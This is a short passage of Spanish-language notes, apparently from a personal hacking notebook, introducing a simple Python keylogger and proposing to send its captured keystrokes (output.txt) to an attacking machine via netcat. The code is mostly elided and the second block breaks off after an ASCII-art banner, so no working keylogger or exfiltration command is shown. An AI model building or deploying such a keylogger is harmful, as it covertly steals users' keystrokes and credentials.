Haríamos un keylogger sencillo de la siguiente forma:
```python
import keyboard
import sys
...
try:
    ...
    detener_script()
```
![[Pasted image 20231216104923.png]]
Y lo podemos mejorar para que envíe el output.txt a una máquina atacante por netcat:
```python
print("""
  .--.
 |o_o | 
